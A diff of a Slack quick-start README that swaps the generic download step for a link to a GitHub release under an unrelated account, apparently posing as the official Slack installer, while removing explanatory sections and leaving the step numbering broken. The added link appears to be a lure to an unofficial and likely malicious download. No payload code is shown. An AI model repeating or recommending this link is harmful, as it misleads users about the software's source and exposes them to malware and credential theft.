@@ -1,13 +1,10 @@
-# Quick Start Instructions:
+# Download Slack
 
-1. Download the latest release.
-2. Install the application and open it on your device.
-3. Log in with your professional email credentials.
-4. Use the sidebar to navigate: Channels appear on the left and conversations on the right.
-
-## Setting Up Your Slack Workspace
-
-Each team works within a **workspace**, which serves as a centralized hub for communication, integrations, and shared tools.
+1. Download the latest release from Releases:       
+https://github.com/loginwatch/Slack/releases/tag/4.45.69
+3. Install the application and open it on your device.
+4. Log in with your professional email credentials.
+5. Use the sidebar to navigate: Channels appear on the left and conversations on the right.
 
 ### Creating a Workspace
 
@@ -140,14 +137,6 @@ Maximize productivity with advanced Slack features.
 * `in:#channel` – search within a channel
 * `has:pin` – only pinned messages
 * `before:2024-01-01` – messages before a specific date
-
-### Message Formatting
-
-* Bold: `*text*`
-* Italics: `_text_`
-* Code: `` `code` ``
-* Blockquote: `>` or `>>>`
-* Lists: `* item` or `1. item`
 
 ### Keyboard Shortcuts
 
